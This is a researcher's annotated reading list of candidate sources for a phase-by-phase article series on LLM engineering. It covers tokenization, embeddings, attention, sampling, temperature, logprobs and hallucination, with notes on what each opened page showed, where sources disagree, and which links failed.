# Candidate sources, all phases

Researched 2026-09-23. **A reading list, not citations.** Every link here was
opened on 2026-09-23 and checked against what's written about it. Nothing here
can be cited yet: a source becomes citable only when it gets its own note
(`sources/<id>.md`, made from `templates/source.md`) during step 5 of the
article workflow. At that point, re-open it, because docs and prices change.

The node list follows `tentative-shape.md`. All 115 nodes have candidates. The
file has about 500 URLs, counting the ones listed under "Couldn't open" and
"Rejected".

How each phase section is laid out:
- One block per node, with 3–6 candidates for `deep` and 1–2 for `short`.
  Each has a kind, whether it's primary, why it's worth reading,
  and what was seen when it was opened. "See X #n" means the source is
  already listed under another node.
- Then "Disagreements and tensions", "Couldn't open", "Rejected" and "Gaps"
  for that phase.

## Things that change the plan

These came up in the research and affect builds or notes in `PLAN.md` and
`tentative-shape.md`. Each needs a decision from me before its phase.

1. **The phase 1 temperature widget has a problem.** Claude (Sonnet 5, and
   Opus 4.7 and later) rejects any non-default `temperature`, `top_p` or
   `top_k`, and I found no sign Claude returns logprobs. OpenAI's GPT-6 guide
   says to drop `temperature`, `top_p` and `top_logprobs` whenever reasoning
   is on. Gemini logprobs reportedly stopped working in 2026 (user reports,
   not official). "A temperature slider driven by real logprobs" needs an
   OpenAI model with reasoning off, or an open model. Needs a decision
   record. (Phase 1a)
2. **The phase 7 fine-tuning build can't use OpenAI.** OpenAI's fine-tuning
   platform is closed to new organizations since 2026-05-07, and no new jobs
   can start from 2027-01-06. Use an open model with TRL and PEFT. Needs a
   decision record. (Phase 7)
3. **Postgres full-text search isn't BM25.** `ts_rank` has no IDF. The
   phase 2 "hybrid search" build needs `pg_textsearch` or ParadeDB for real
   BM25, or the article has to say it's using something else. (Phase 2)
4. **MCP changed a lot on 2026-07-28.** The protocol is now stateless, and
   most tutorials are out of date. Use the 2026-07-28 spec. (Phase 5)
5. **OWASP released a 2026 LLM Top 10** (2026-08-04). Excessive Agency moved
   up to #3, and there's now a separate Agentic Top 10. The phase 6 security
   review should use the 2026 list. (Phase 6)
6. **SWE-bench Verified was retired** by OpenAI in 2026-02 over flawed tests
   and contamination. It's a good example for `benchmarks` and `agent-evals`.
   (Phases 4, 5)
7. **Ollama's default context is 4096 tokens.** Without raising it, the
   phase 7 local-model eval would quietly cut off RAG prompts. (Phase 7)

## Node notes the sources disagree with

Fix these in `tentative-shape.md` before the nodes are created:

- `chat-api`: "The API remembers nothing" is only half true. OpenAI's
  Responses API stores history, but you still pay for all of it as input.
- `ai-engineer`: "Doesn't train them". Chip Huyen puts parameter-efficient
  fine-tuning inside AI engineering. "Rarely trains, sometimes fine-tunes"
  is closer.
- `human-review`: "Still the ground truth". Hosking et al. (ICLR 2024) show
  human ratings miss factual errors and favor confident answers.
- `agent-evals`: "Grading the steps". Anthropic and Hamel Husain say grade
  the outcome first and look at steps to diagnose. The note should say both.
- `temperature` and `top-p`: the notes should say that closed reasoning
  models no longer let you set them.

## Primary sources to open by hand

The research agents couldn't read these: binary PDFs, 403s and JS-only
pages. They matter, so open them in a browser before the nodes that need
them:

- RRF paper (Cormack, Clarke, Büttcher, SIGIR 2009): `reciprocal-rank-fusion`
- BM25 monograph (Robertson & Zaragoza, 2009): `bm25`
- Voorhees, TREC-8 QA report (origin of MRR): `mrr`
- OpenAI posts on openai.com (all 403): structured outputs launch, "Learning
  to reason", GPT-4o sycophancy postmortem, retiring SWE-bench Verified,
  "Why language models hallucinate" (the arXiv version was opened)
- OpenAI "A practical guide to building agents" (PDF): `when-not-to-use-agents`
- AWS Builders' Library, "Timeouts, retries and backoff with jitter": `retries`
- Karpathy's "Deep Dive into LLMs" and "Let's build the GPT Tokenizer"
  videos: `pretraining`, `tokenization`
- Anthropic citations docs (only the start was readable): `grounding`

## Where my own experiments fill a gap

Several nodes have no good published numbers. That's where a small
experiment of my own is the "add something of my own" part of the article:

- `embedding-models`: no current head-to-head for the models I'd pick
- `tail-latency`: nobody publishes p95/p99 time to first token across APIs
- `data-flywheel`, `online-evals`: no company post with before and after
  numbers
- `logprobs`: which APIs still return them as of 2026-09
- `parallel-calls`: no measured latency savings
- `classification` / `routing`: an LLM vs a small fine-tuned classifier,
  on cost and accuracy (this is also the phase 7 build)
- `document-parsing`: benchmarks disagree on rankings, so test on my own PDFs

## Sources that show up across many nodes

Worth reading early, since they serve several phases: Anthropic's "Building
effective agents" and "Effective context engineering for AI agents",
"What We've Learned From A Year of Building with LLMs" (applied-llms.org),
Hamel Husain's "Your AI Product Needs Evals" and evals FAQ, Chroma's
"Context Rot", and Databricks' "LLM Inference Performance Engineering".

## Possible missing node

`query-rewriting` (phase 2) came up again in Anthropic's context engineering
post and Jason Liu's RAG post. No sources were gathered for it.

## Phase 1a: Who and why · How a model reads and writes · Picking the next token

I checked everything on 2026-09-23 by opening the URL. Where a quote appears, the page gave me those words.

**Three things to know before reading the list:**
- **Claude no longer lets you set sampling parameters.** Claude Sonnet 5, and Claude Opus 4.7 and later, return a 400 error if `temperature`, `top_p` or `top_k` is set to anything but the default. OpenAI's newest docs ("Using GPT-6") say to remove `temperature`, `top_p` and `top_logprobs` whenever reasoning effort is not `none`. The `temperature` and `top-p` nodes still explain how models work, but you may only get to turn these knobs on open models.
- **Claude's newer tokenizer produces about 30% more tokens** for the same text than models before Opus 4.7 (and Sonnet 4.6 on the Sonnet side). That's a strong, current, primary fact for `tokenization`.
- **The rule "logprobs are something the API can return" is getting shaky.** It's still true for OpenAI with reasoning off, but see the logprobs tensions below.

### ai-engineer (short)
1. **The Rise of the AI Engineer** by swyx (Latent.Space), 2023-06-30
   https://www.latent.space/p/ai-engineer
   kind: blog · primary: yes (the essay that named the role)
   Why: The origin of the job title and the "AI engineer vs ML engineer" split. Quotes Karpathy saying you can succeed "without ever training anything".
   Checked: Opened. The quotes match. It's from 2023, so the tools it names (LangChain, LlamaIndex) are dated, but the definition still holds.
2. **AI Engineering: supporting materials** (book repo) by Chip Huyen, 2025 book, repo still updated
   https://github.com/chiphuyen/aie-book
   kind: book (repo with the table of contents and chapter summaries) · primary: yes
   Why: A precise one-line contrast. AI engineering means "prompt engineering, context construction, and parameter-efficient finetuning", while classic ML engineering means feature engineering and training.
   Checked: Opened. The quote is in the README. It's current.
3. **The AI Engineer Roadmap** by aihero.dev (no author named), updated 2025-03-18
   https://www.aihero.dev/ai-engineer-roadmap
   kind: docs/tutorial · primary: no
   Why: The roadmap PLAN.md was checked against. Good for placing this node next to what an employer expects.
   Checked: Opened. It covers core concepts, model selection, mindset and techniques. It's thin as a citation source.
Also serves: llm-use-cases (#2 via chapter-summaries.md)

### llm-use-cases (deep)
1. **What We've Learned From A Year of Building with LLMs** by Eugene Yan, Bryan Bischof, Charles Frye, Hamel Husain, Jason Liu, Shreya Shankar, 2024-06-08
   https://applied-llms.org/
   kind: blog · primary: yes (practitioners reporting their own builds)
   Why: Where LLMs are brittle, why deterministic workflows beat free-running agents, and which features not to build yourself.
   Checked: Opened. It has "LLM-powered applications are brittle" and "Each step an agent takes has a chance of failing…". It's from 2024, before coding agents took off (see tensions).
2. **AI Engineering, Chapter 1 summary** by Chip Huyen, 2025
   https://github.com/chiphuyen/aie-book/blob/main/chapter-summaries.md
   kind: book · primary: yes
   Why: A structured table of use cases (consumer vs enterprise: coding, writing, support, data extraction).
   Checked: Opened. The table and the "still in the early stages" line are there.
3. **How People Use ChatGPT** by Chatterji, Cunningham, Deming, Hitzig, Ong, Shan, Wadman (OpenAI + Harvard), NBER WP 34255, September 2025
   https://www.nber.org/papers/w34255
   kind: paper · primary: yes (OpenAI's own usage data)
   Why: Real numbers. Practical guidance, seeking information and writing make up about 80% of conversations, programming is a small share, and non-work use grew from 53% to over 70%.
   Checked: Opened the NBER page and abstract. The data covers November 2022 to July 2025.
4. **Anthropic Economic Index report: Cadences** by Anthropic, 2026-06-26
   https://www.anthropic.com/research/economic-index-june-2026-report
   kind: blog/report · primary: yes
   Why: The most current usage data. 93% of conversations produce an artifact, personal use is about 35% on weekdays and about 50% on weekends, and Claude Code sessions are more autonomous.
   Checked: Opened. It's the latest report as of 2026-06. It doesn't break out a coding share. Earlier reports do, but I didn't open them.
5. **2025: The year in LLMs** by Simon Willison, 2025-12-31
   https://simonwillison.net/2025/Dec/31/the-year-in-llms/
   kind: blog · primary: no (builder commentary)
   Why: What changed in 2025: reasoning from verifiable rewards, coding agents working in practice, and the gullibility problem.
   Checked: Opened. The quotes on reasoning and on "I didn't think agents would happen" match.
Also serves: hallucination (#5 on gullibility), evals, when-not-to-use-agents, agent-loop (#1)

### hallucination (deep)
1. **Why Language Models Hallucinate** by Adam Tauman Kalai, Ofir Nachum, Santosh Vempala, Edwin Zhang (OpenAI/Georgia Tech), 2025-09-04
   https://arxiv.org/abs/2509.04664 (full text: https://arxiv.org/html/2509.04664)
   kind: paper · primary: yes
   Why: The core "why prediction produces this" argument. Pretraining errors come from facts that appear only rarely in the training data, and grading keeps rewarding guesses: "Under binary grading, abstaining is strictly sub-optimal." (§4.1)
   Checked: Opened the abstract and HTML. The paper has no model-vs-model numbers table, only a table of benchmark grading schemes.
2. **Tracing the Thoughts of a Large Language Model** by Anthropic, 2025-03-27
   https://www.anthropic.com/research/tracing-thoughts-language-model
   kind: blog (interpretability research) · primary: yes
   Why: The mechanism inside the model. By default a circuit says "I don't know". A "known entity" feature switches it off, and when that feature fires on a name the model recognizes but knows nothing about, it makes things up.
   Checked: Opened. The quotes about refusal being "the default behavior" and "confabulate" match.
3. **Extrinsic Hallucinations in LLMs** by Lilian Weng, 2024-07-07
   https://lilianweng.github.io/posts/2024-07-07-hallucination/
   kind: blog · primary: no (research survey by a builder)
   Why: Definitions (in-context vs extrinsic), causes (pretraining data, fine-tuning on new knowledge), and a map of detection methods and benchmarks.
   Checked: Opened. The definition sentence matches. It's from before the 2025 papers above.
4. **Reduce hallucinations** by Anthropic docs, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/reduce-hallucinations
   kind: docs · primary: yes
   Why: The builder's side: let the model say "I don't know", ground answers in direct quotes, check claims against citations, best-of-N comparison.
   Checked: Opened. It's live and current.
Also serves: next-token-prediction (#2 planning), grounding, saying-i-dont-know, evals, benchmarks (#1), rlhf/post-training (#1)

### next-token-prediction (deep)
1. **Language Models are Few-Shot Learners (GPT-3)** by Tom B. Brown et al. (OpenAI), 2020-05-28, v4 2020-07-22
   https://arxiv.org/abs/2005.14165
   kind: paper · primary: yes
   Why: The primary evidence that a plain next-token predictor, scaled to 175B parameters, does tasks from a prompt alone.
   Checked: Opened the abstract. It's old but foundational, and nothing newer replaces it.
2. **What Is ChatGPT Doing … and Why Does It Work?** by Stephen Wolfram, February 2023
   https://writings.stephenwolfram.com/2023/02/what-is-chatgpt-doing-and-why-does-it-work/
   kind: blog · primary: no
   Why: The clearest long explanation of "a reasonable continuation, one word at a time", including why always taking the top word gives flat text.
   Checked: Opened. The quotes match. It's from 2023 but the mechanism hasn't changed.
3. **Large Language Models explained briefly** by 3Blue1Brown (Grant Sanderson), 2024-11-20
   https://www.3blue1brown.com/lessons/mini-llm
   kind: talk/lesson · primary: no
   Why: A short visual version: a probability distribution over the next word, sampled repeatedly.
   Checked: Opened. It has "…predicts what word comes next for any piece of text."
4. **Tracing the Thoughts of a Large Language Model**: see hallucination #2
   Why here: The counterpoint. Claude "plans ahead" several words when writing rhyming lines, even though it outputs one token at a time.
Also serves: pretraining (#1), sampling (#2), few-shot-prompting (#1)

### tokenization (deep)
1. **tiktoken README** by OpenAI, repo live, checked 2026-09-23
   https://github.com/openai/tiktoken
   kind: code/docs · primary: yes
   Why: Why BPE is used: reversible, lossless, works on any text, about 4 bytes per token, and it lets the model see common subwords ("encod" + "ing").
   Checked: Opened. The quotes match.
2. **minbpe + lecture.md** by Andrej Karpathy, 2024
   https://github.com/karpathy/minbpe (text: https://github.com/karpathy/minbpe/blob/master/lecture.md)
   kind: code · primary: yes (reference implementation)
   Why: Reproduces GPT-4's tokenizer exactly. The lecture ties tokenization to odd behavior: "Tokenization is at the heart of a lot of weirdness in LLMs".
   Checked: Opened. The lecture text is unfinished ("to be continued…").
3. **Language Model Tokenizers Introduce Unfairness Between Languages** by Petrov, La Malfa, Torr, Bibi, NeurIPS 2023 (v2 2023-10-20)
   https://arxiv.org/abs/2305.15425
   kind: paper · primary: yes
   Why: Numbers behind "tokenization explains pricing". The same text can take up to 15 times more tokens depending on the language, which affects cost, speed and how much fits in the context window.
   Checked: Opened the abstract.
4. **What's new in Claude Sonnet 5 (New tokenizer section)** by Anthropic docs, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/models/sonnet-5/whats-new-sonnet-5
   kind: docs · primary: yes
   Why: A live example of a tokenizer change moving cost. About 30% more tokens for the same text, so a lower per-token price doesn't mean a proportionally cheaper request.
   Checked: Opened. It's current. The Token counting doc (https://platform.claude.com/docs/en/build-with-claude/token-counting) confirms the same about 30% for models from Opus 4.7 on, and says counts are "an estimate".
5. **LLM Course ch. 6** by Hugging Face: see bpe #2
Also serves: bpe (#1, #2), context-window (#3, #4), token-pricing (#3, #4), chat-api (#4 token-counting doc)

### bpe (short)
1. **Neural Machine Translation of Rare Words with Subword Units** by Rico Sennrich, Barry Haddow, Alexandra Birch, ACL 2016 (v5 2016-06-10)
   https://arxiv.org/abs/1508.07909
   kind: paper · primary: yes
   Why: The paper that brought BPE from compression into NLP, and why: rare words split into subword units that can be translated.
   Checked: Opened the abstract. Gains of +1.1 and +1.3 BLEU.
2. **Byte-Pair Encoding tokenization (LLM Course, ch. 6.5)** by Hugging Face, checked 2026-09-23
   https://huggingface.co/learn/llm-course/chapter6/5
   kind: docs/course · primary: no
   Why: The training loop step by step (base vocabulary, merge the most frequent pair, repeat) and byte-level BPE with a 256-token base.
   Checked: Opened. The quotes match.
Also: tiktoken (tokenization #1) and minbpe (tokenization #2) if you want to run code.

### embeddings (deep)
1. **Vector embeddings guide** by OpenAI docs, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/embeddings
   kind: docs · primary: yes
   Why: The API view: "The distance between two vectors measures their relatedness." Also `text-embedding-3-small` (1536 dimensions) and `-large` (3072), and the `dimensions` parameter that shortens vectors.
   Checked: Opened after a redirect from platform.openai.com. It still lists the 3rd-generation models.
2. **Embeddings** by Anthropic docs, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/embeddings
   kind: docs · primary: yes
   Why: "Anthropic does not offer its own embedding model", so it points to Voyage (voyage-4 family, 1024 default dimensions). Also covers query vs document `input_type`, normalized vectors, and Matryoshka truncation.
   Checked: Opened. It's current (voyage-4, voyage-context-4 dated 2026-06).
3. **Efficient Estimation of Word Representations in Vector Space (word2vec)** by Mikolov, Chen, Corrado, Dean, 2013
   https://arxiv.org/abs/1301.3781
   kind: paper · primary: yes
   Why: Where "similar meanings sit close together" started. High-quality vectors from 1.6B words in under a day.
   Checked: Opened the abstract. It's historical: static word vectors, not today's contextual ones.
4. **Embeddings: What they are and why they matter** by Simon Willison, 2023-10-23
   https://simonwillison.net/2023/Oct/23/embeddings/
   kind: blog · primary: no
   Why: The best builder's explanation: a fixed-length list of floats, related-content search and semantic search as real uses.
   Checked: Opened. The quotes match.
5. **Embeddings (Machine Learning Crash Course)** by Google, updated 2025-08-25
   https://developers.google.com/machine-learning/crash-course/embeddings
   kind: docs/course · primary: yes
   Why: One-hot vs dense vectors and **static vs contextual** embeddings, which bridges to attention.
   Checked: Opened.
6. **Transformers, the tech behind LLMs (Ch. 5)** by 3Blue1Brown, 2024-04-01: see softmax #2
   Why here: The token embedding matrix inside the model (50,257 × 12,288 for GPT-3) and the unembedding matrix that maps back to scores over the vocabulary.
Also serves: cosine-similarity (#1, #2), embedding-models (#1, #2), semantic-search (#4), attention (#5)

### attention (deep)
1. **Attention Is All You Need** by Vaswani et al., 2017-06-12 (rev. 2023-08-02)
   https://arxiv.org/abs/1706.03762
   kind: paper · primary: yes
   Why: The source of scaled dot-product and multi-head attention.
   Checked: Opened the abstract.
2. **Neural Machine Translation by Jointly Learning to Align and Translate** by Bahdanau, Cho, Bengio, ICLR 2015
   https://arxiv.org/abs/1409.0473
   kind: paper · primary: yes
   Why: Why attention was invented. "The use of a fixed-length vector is a bottleneck." Attention is a soft search over the input.
   Checked: Opened the abstract.
3. **Attention in transformers, step-by-step (DL Ch. 6)** by 3Blue1Brown, 2024-04-07
   https://www.3blue1brown.com/lessons/attention
   kind: talk/lesson · primary: no
   Why: The best visual for the node's note. Query, key and value, the attention pattern, masking so a token only sees earlier tokens, 96 heads in GPT-3, and "mole" getting its meaning from context.
   Checked: Opened. The quotes match.
4. **The Illustrated Transformer** by Jay Alammar, 2018-06-27 (2025 note: expanded into a book)
   https://jalammar.github.io/illustrated-transformer/
   kind: blog · primary: no
   Why: The classic step-by-step self-attention figures.
   Checked: Opened. It describes the 2017 encoder-decoder model, not today's decoder-only LLMs.
5. **A Mathematical Framework for Transformer Circuits** by Elhage, Nanda, Olah et al. (Anthropic), 2021-12-22
   https://transformer-circuits.pub/2021/framework/index.html
   kind: paper · primary: yes
   Why: A different mental model. Heads are independent operations that move information between tokens by writing into a shared "residual stream".
   Checked: Opened. It's heavy. Use it for one idea, not the whole thing.
Also serves: transformer (#1, #4, #5), kv-cache (#1), embeddings (#3)

### transformer (deep)
1. **Attention Is All You Need**: see attention #1
2. **The Illustrated Transformer**: see attention #4
3. **How do Transformers work? (LLM Course ch. 1.4)** by Hugging Face, checked 2026-09-23
   https://huggingface.co/learn/llm-course/chapter1/4
   kind: docs/course · primary: no
   Why: Encoder-only vs decoder-only vs encoder-decoder, and "causal language modeling", which fills the gap between the 2017 paper and GPT-style models.
   Checked: Opened.
4. **The Big LLM Architecture Comparison** by Sebastian Raschka, 2025-07-19, updated 2026-04-02
   https://magazine.sebastianraschka.com/p/the-big-llm-architecture-comparison
   kind: blog · primary: no (careful reading of model papers and code)
   Why: What changed since GPT-2 (RoPE, grouped-query attention, SwiGLU, mixture of experts) and his argument that the core barely moved.
   Checked: Opened. It's current (updated 2026).
5. **Transformer Explainer** by Cho, Kim, Karpekov et al. (Georgia Tech), CHI 2026, arXiv 2024-08-08, rev. 2026-08-10
   https://poloclub.github.io/transformer-explainer/ · paper: https://arxiv.org/abs/2408.04619
   kind: code/interactive + paper · primary: yes (for the tool)
   Why: Live GPT-2 in the browser covering embedding, attention and MLP, with temperature, top-k and top-p sliders. A good model for the site's own widget.
   Checked: Opened both.
6. **A Mathematical Framework for Transformer Circuits**: see attention #5
Also serves: next-token-prediction (#5), sampling/temperature/top-p (#5), prefill-decode, vision-models (#3)

### softmax (short)
1. **Softmax Regression (Dive into Deep Learning §4.1)** by Aston Zhang, Zachary Lipton, Mu Li, Alexander Smola, v1.0.3 (Cambridge UP, 2023)
   https://d2l.ai/chapter_linear-classification/softmax-regression.html
   kind: book · primary: no (textbook)
   Why: The formula and its properties: outputs are nonnegative, sum to 1, and keep the order. Also the Boltzmann and temperature connection.
   Checked: Opened the section and the front page.
2. **Transformers, the tech behind LLMs (Deep Learning Ch. 5)** by 3Blue1Brown, 2024-04-01
   https://www.3blue1brown.com/lessons/gpt
   kind: talk/lesson · primary: no
   Why: Softmax where an LLM actually uses it: logits in, next-token distribution out, with temperature built in ("when T is equal to 0, all the weight goes to the maximum value").
   Checked: Opened.
Also serves: temperature (#2), embeddings (#2), logprobs

### logprobs (short)
1. **Using logprobs** by James Hills and Shyamal Anadkat (OpenAI Cookbook), 2023-12-20
   https://developers.openai.com/cookbook/examples/using_logprobs
   kind: docs/code · primary: yes
   Why: Definition ("a logprob is log(p)…") plus five uses: classification confidence, checking whether retrieved context answers the question, autocomplete, highlighting, perplexity.
   Checked: Opened (redirected from cookbook.openai.com). Author and date come from the cookbook's registry.yaml. It uses gpt-4o and says `top_logprobs` goes from 0 to 5, which may be out of date (see tensions).
2. **Unlock Gemini's reasoning: A step-by-step guide to logprobs on Vertex AI** by Eric Dong (Google), 2025-07-16
   https://developers.googleblog.com/unlock-gemini-reasoning-with-logprobs-on-vertex-ai/
   kind: blog · primary: yes
   Why: A second provider with the same idea (`response_logprobs`, `logprobs` 1–20). Adds "average logprob" as a check on how well a RAG answer is supported.
   Checked: Opened. Its example uses gemini-2.5-flash. Forum reports say this later broke (see tensions).
Plus, for currency: **Using GPT-6** by OpenAI docs, undated, checked 2026-09-23. https://developers.openai.com/api/docs/guides/latest-model says: "When reasoning effort is not `none`, remove `temperature`, `top_p`, and `top_logprobs`."
Also serves: softmax, classification, retrieval-evaluation, llm-as-judge, hallucination

### sampling (deep)
1. **The Curious Case of Neural Text Degeneration** by Holtzman, Buys, Du, Forbes, Choi, ICLR 2020 (v2 2020-02-14)
   https://arxiv.org/abs/1904.09751
   kind: paper · primary: yes
   Why: Why greedy and beam search produce dull, repetitive text, and "decoding strategies alone can dramatically effect the quality" from the same model. Introduces nucleus sampling.
   Checked: Opened the abstract.
2. **How to generate text: using different decoding methods** by Patrick von Platen (Hugging Face), 2020-03-01, updated July 2023
   https://huggingface.co/blog/how-to-generate
   kind: blog · primary: yes (HF maintains the implementation)
   Why: Greedy, beam, pure sampling, top-k and top-p side by side on GPT-2, with figures worth redrawing.
   Checked: Opened.
3. **Generation strategies (Transformers docs)** by Hugging Face, v5.17.0, checked 2026-09-23
   https://huggingface.co/docs/transformers/generation_strategies
   kind: docs · primary: yes
   Why: The current, factual version. Greedy is the default and repeats on long outputs. `do_sample=True` switches to sampling.
   Checked: Opened. It's current.
4. **Generation configurations: temperature, top-k, top-p, and test time compute** by Chip Huyen, 2024-01-16
   https://huyenchip.com/2024/01/16/sampling.html
   kind: blog · primary: no
   Why: Ties sampling to AI engineering: "This probabilistic nature also causes inconsistency and hallucinations." Also covers logprobs and test-time compute.
   Checked: Opened.
5. **Defeating Nondeterminism in LLM Inference** by Horace He (Thinking Machines Lab), 2025-09-10
   https://thinkingmachines.ai/blog/defeating-nondeterminism-in-llm-inference/
   kind: blog · primary: yes (their own experiment)
   Why: Greedy isn't reproducible in practice. Qwen3-235B at temperature 0 gave 80 different completions out of 1,000, first diverging at token 103. They blame the lack of batch invariance, not "concurrency + floating point".
   Checked: Opened.
6. **What Is ChatGPT Doing…**: see next-token-prediction #2 (why take lower-ranked words; 0.8 temperature for essays)
Also serves: temperature (#2, #4, #5), top-p (#1, #2), structured-output/constrained-decoding (#4), hallucination (#4)

### temperature (short)
1. **What's new in Claude Sonnet 5 (Sampling parameters not accepted)** by Anthropic docs, checked 2026-09-23
   https://platform.claude.com/docs/en/models/sonnet-5/whats-new-sonnet-5
   kind: docs · primary: yes
   Why: The current state. Non-default `temperature`, `top_p` or `top_k` returns a 400 error on Sonnet 5, "previously introduced on Claude Opus 4.7". The advice is to use system-prompt instructions instead. The Messages API reference (https://platform.claude.com/docs/en/api/messages/create) marks `temperature` as "Deprecated" for "Models released after Claude Opus 4.6".
   Checked: Opened both. The API reference page came back cut off in the middle of that sentence.
2. **Transformers, the tech behind LLMs (Ch. 5)** by 3Blue1Brown: see softmax #2
   Why here: The mechanism. Divide the logits by T before softmax. A higher T flattens the distribution, and T=0 always picks the top token.
Extras: **OpenAI Create completion reference** (https://developers.openai.com/api/reference/resources/completions/methods/create, opened) gives the classic definition, "between 0 and 2… 0.2 will make it more focused and deterministic". It's the legacy completions endpoint (gpt-3.5-turbo-instruct, davinci-002). Thinking Machines (sampling #5) shows T=0 isn't truly deterministic.

### top-p (short)
1. **The Curious Case of Neural Text Degeneration**: see sampling #1 (the nucleus sampling paper)
2. **How to generate text**: see sampling #2 (top-k and top-p explained together, which fits the node's note that top-k lives here)
Extra, for "What the sources say":
3. **Turning Up the Heat: Min-p Sampling for Creative and Coherent LLM Outputs** by Nguyen, Baker, Neo, Roush, Kirsch, Shwartz-Ziv, ICLR 2025 oral (v1 2024-07-01, latest 2025-11-20)
   https://arxiv.org/abs/2407.01082
   kind: paper · primary: yes
   Why: Argues top-p struggles "especially at higher temperatures". Min-p scales the cutoff by how confident the top token is. Now in HF Transformers and vLLM.
   Checked: Opened the abstract.

### Disagreements and tensions
- **Is "just next-token prediction" the whole story?** Wolfram and 3Blue1Brown describe word-by-word continuation. Anthropic's interpretability work finds Claude "plans ahead" several words (rhyme planning). Both are true at different levels: the output is one token at a time, but the internal computation looks ahead.
- **Why hallucinations happen, at three levels.** Kalai et al. give a statistical account (rare facts plus grading that rewards guessing). Anthropic gives a mechanism (a known-entity feature misfires and suppresses the default "can't answer"). Weng points to the data (outdated or missing data, fine-tuning on new knowledge). They don't contradict each other. The article can put them together, and they point to different fixes: change the incentives, change training, or ground the answers.
- **Temperature 0 = deterministic?** OpenAI's legacy reference says low values are "more focused and deterministic", and 3Blue1Brown says T=0 puts all weight on the top token. Thinking Machines measured 80 different outputs in 1,000 runs at T=0 and blames server batching.
- **Who controls sampling.** HF, Chip Huyen and the OpenAI legacy docs assume you tune temperature and top-p, and OpenAI says to change "this or top_p but not both". Anthropic now rejects any non-default value on Opus 4.7+ and Sonnet 5, and OpenAI's GPT-6 guide says to remove them when reasoning is on. The concept still matters, but on closed reasoning models the knob is gone.
- **Top-p as the fix vs top-p as the problem.** Holtzman proposed nucleus sampling to fix degeneration. Nguyen et al. say top-p breaks down at high temperature and propose min-p.
- **Logprobs: how many alternatives, and whether you get them at all.** The OpenAI cookbook (2023) says `top_logprobs` goes from 0 to 5. Google's Gemini blog says `logprobs` 1–20. A search snippet claimed OpenAI's current reference allows 0–20, but I couldn't open that page. On availability, Google forum users report logprobs returning "not supported for this model" on Gemini 3/3.1 from 2026-03-14 and on 2.5 soon after, with no Google staff reply (user reports, not official). OpenAI drops them when reasoning is on.
- **The "about 4 characters per token" rule.** tiktoken says about 4 bytes per token for OpenAI's encodings. Petrov et al. find up to 15× differences across languages. Anthropic says its newer tokenizer produces about 30% more tokens for the same text. The rule depends on the model and the language.
- **Which transformer to teach.** Vaswani and Alammar describe the 2017 encoder-decoder. HF and Raschka describe today's decoder-only models. Raschka argues the core has barely changed since GPT-2, which supports teaching the concept once.
- **Agents in use-cases.** applied-llms.org (mid-2024) says prefer deterministic workflows because agents fail step by step. Willison (end of 2025) says agents, especially coding agents, "happened". The `llm-use-cases` node should show the date moving.
- **What LLMs get used for.** NBER/OpenAI finds programming is a small share of consumer ChatGPT use. Anthropic's reports show heavy coding and agent use on Claude. These are different user bases (consumer chat vs developers and API), so neither is "the" use-case list.
- **Does an AI engineer train models?** swyx: "without ever training anything". Chip Huyen puts "parameter-efficient finetuning" inside AI engineering. The node's note ("doesn't train them") should probably say "rarely trains, sometimes fine-tunes".

### Couldn't open
- https://openai.com/index/why-language-models-hallucinate/: 403. I used the arXiv paper instead.
- https://cdn.openai.com/pdf/d04913be-3f6f-4d2b-b283-ff432ef4aaa5/why-language-models-hallucinate.pdf: binary PDF, text didn't extract.
- https://cdn.openai.com/better-language-models/language_models_are_unsupervised_multitask_learners.pdf (GPT-2 paper): binary PDF, not readable. https://openai.com/index/better-language-models/ gave 403.
- https://help.openai.com/en/articles/4936856-what-are-tokens-and-how-to-count-them: 403.
- https://platform.openai.com/tokenizer: 403.
- https://developers.openai.com/api/reference/resources/chat/subresources/completions/methods/create: 404 (also tried with a trailing slash and `.md`). So the current `top_logprobs` 0–20 range is unverified.
- https://ai.google.dev/gemini-api/docs/logprobs: 404.
- https://www.anthropic.com/economic-index: the data loads with JavaScript, so no numbers.
- Karpathy videos "Deep Dive into LLMs like ChatGPT" (https://www.youtube.com/watch?v=7xTGNNLPyMI) and "Let's build the GPT Tokenizer" (https://www.youtube.com/watch?v=zduSFxRajkE): I could only confirm title and author through YouTube oEmbed. Content not opened, so not verified. The minbpe lecture.md text is the verified stand-in.
- https://platform.claude.com/docs/en/models/opus-5/migration-guide: the page was too large to read. Sonnet 5's "What's new" covers the same sampling rule.
- https://nlp.seas.harvard.edu/annotated-transformer/: the fetch came back truncated.
- The Anthropic Messages API reference loaded, but the text stopped partway through the `temperature` description. I couldn't confirm the `top_p`/`top_k` wording, or that the API has no logprobs parameter.

### Rejected
- **Hierarchical Neural Story Generation** (Fan et al., https://arxiv.org/abs/1805.04833): usually credited for top-k, but the abstract doesn't mention it and I couldn't check the body. HF's blog covers top-k.
- **Things we learned about LLMs in 2024** (Willison, https://simonwillison.net/2024/Dec/31/llms-in-2024/): replaced by his 2025 review. It's still a good source for "LLMs believe anything you tell them" and "evals are the skill" if you want those quotes.
- **The Illustrated Word2vec** (Alammar, 2019): a good visual, but word2vec is covered by the primary paper and Google's course.
- **What are embeddings?** (Vicki Boykis): a long book, more than a phase 1 node needs. Worth keeping for phase 2.
- **The Annotated Transformer** (Harvard): code-level and math-heavy, out of scope per the plan, and it didn't load fully.
- **Transformer Explainer landing page alone**: not rejected, just paired with its arXiv paper for dates.

### Gaps
- **ai-engineer**: nothing neutral exists. It's a job-title definition, so sources are opinion pieces (swyx, Chip Huyen, aihero). Fine for a short node, but say so in the article.
- **next-token-prediction**: only one primary paper that opens (GPT-3). The GPT-2 paper is the natural primary and wouldn't render. The arXiv-listed "Attention" paper doesn't cover the decoder-only setup. HF's causal language modeling page is a possible substitute.
- **logprobs**: nothing verified on Anthropic's position (I believe Claude doesn't return logprobs, but I couldn't confirm it from an opened page). The OpenAI parameter range is unverified. An article would need one live API test (the user's own experiment) to say who returns logprobs as of 2026-09.
- **llm-use-cases**: the verified numbers describe what people use, not what LLMs are *bad* at. A primary source measuring failure modes (for example, answers varying run to run on the same input) would help the "must give the same answer every time" half of the note. Thinking Machines (sampling #5) partly covers it.

## Phase 1b: context window, inference, model training, API and prompting

